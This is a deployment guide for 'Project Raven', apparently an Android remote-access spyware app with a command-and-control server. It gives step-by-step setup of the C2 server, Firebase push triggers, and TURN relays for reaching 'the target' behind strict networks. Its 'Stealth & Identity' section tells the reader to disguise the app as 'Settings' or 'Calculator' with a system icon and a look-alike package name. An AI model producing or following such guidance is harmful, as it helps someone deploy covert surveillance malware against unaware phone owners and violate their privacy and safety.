# PROJECT RAVEN: DEPLOYMENT & CUSTOMIZATION GUIDE

**"The difference between a toy and a weapon is configuration."**

This document outlines every single file you must modify before deploying Project Raven to the real world. Do not skip any steps.

---

## 1. SERVER CONFIGURATION (`/SERVER`)

### A. The Key (Firebase)
You currently have a placeholder logic. For the "Trigger" to work, you must authenticate with Google.
*   **File:** `SERVER/firebase-key.json` (Does not exist yet)
*   **Action:**
    1.  Go to Firebase Console > Project Settings > Service Accounts.
    2.  Generate New Private Key.
    3.  Rename the downloaded file to `firebase-key.json`.
    4.  Place it in the `SERVER/` root directory.
    5.  **NEVER COMMIT THIS FILE TO GITHUB.**

### B. Security Hardening (CORS)
Currently, the server accepts connections from *anywhere*. In production, you only want your dashboard and your specific app to connect.
*   **File:** `SERVER/server.js`
*   **Line:** ~22 (`cors: { origin: "*" }`)
*   **Action:** Change `"*"` to your actual domain (e.g., `"https://raven-c2.azurewebsites.net"`).

### C. WebRTC Reliability (TURN Servers)
Google's public STUN server (`stun.l.google.com`) works for simple connections. However, if the target is on a strict corporate network or mobile data with symmetric NAT, **it will fail**.
*   **File:** `SERVER/public/js/dashboard.js`
*   **Line:** ~115 (`const rtcConfig = ...`)
*   **Action:** Add a TURN server. You can rent one or host your own (Coturn).
    ```javascript
    const rtcConfig = {
        iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { 
                urls: 'turn:your-turn-server.com:3478', 
                username: 'user', 
                credential: 'password' 
            }
        ]
    };
    ```

---

## 2. ANDROID CONFIGURATION (`/APK`)

### A. The Connection String (CRITICAL)
The app ships with a hardcoded URL to find the server for the first time. If this is wrong, the app is dead on arrival.
*   **File:** `app/src/main/java/com/project/raven/ConfigManager.kt`
*   **Line:** ~11 (`private const val DEFAULT_URL`)
*   **Action:** Change `"https://your-c2-server.herokuapp.com/api/v1"` to your deployed server URL (e.g., `"https://raven-c2.azurewebsites.net/api/v1"`).
    *   *Note:* Ensure you keep the `/api/v1` suffix if your routes expect it.

### B. Firebase Configuration
The app needs to know which Firebase project to listen to.
*   **File:** `app/google-services.json` (Does not exist yet)
*   **Action:**
    1.  Go to Firebase Console > Project Settings > General.
    2.  Add an Android App (Package name: `com.project.raven`).
    3.  Download `google-services.json`.
    4.  Place it in `APK/app/`.

### C. Stealth & Identity
*   **File:** `APK/app/src/main/AndroidManifest.xml`
*   **Action:**
    *   **Package Name:** Change `com.project.raven` to something innocuous like `com.android.settings.sync` (requires refactoring all Kotlin files).
    *   **App Name:** Change `android:label="Raven"` to `Settings` or `Calculator`.
    *   **Icon:** Replace `ic_launcher` with a system icon.

---

## 3. HOSTING REQUIREMENTS

### A. HTTPS is Mandatory
WebRTC **will not work** over HTTP (except on localhost).
*   **Requirement:** Your server MUST have an SSL certificate.
*   **Solution:**
    *   **Azure/Heroku/Render:** They provide HTTPS by default (`https://...`).
    *   **VPS (DigitalOcean/AWS):** Use `certbot` (Let's Encrypt) to generate a free certificate.

### B. Port Forwarding
*   **Requirement:** The server needs to expose the port (default 3000) to the internet.
*   **Azure:** Set the `WEBSITES_PORT` environment variable to `3000`.

---

## 4. DEPLOYMENT CHECKLIST

1.  [ ] **Server:** `firebase-key.json` added.
2.  [ ] **Server:** Deployed to Cloud Provider (Azure/Heroku).
3.  [ ] **Server:** HTTPS verified.
4.  [ ] **Android:** `google-services.json` added.
5.  [ ] **Android:** `ConfigManager.kt` updated with **HTTPS** URL.
6.  [ ] **Android:** Build Release APK (`./gradlew assembleRelease`).

**Good luck, Boss.**
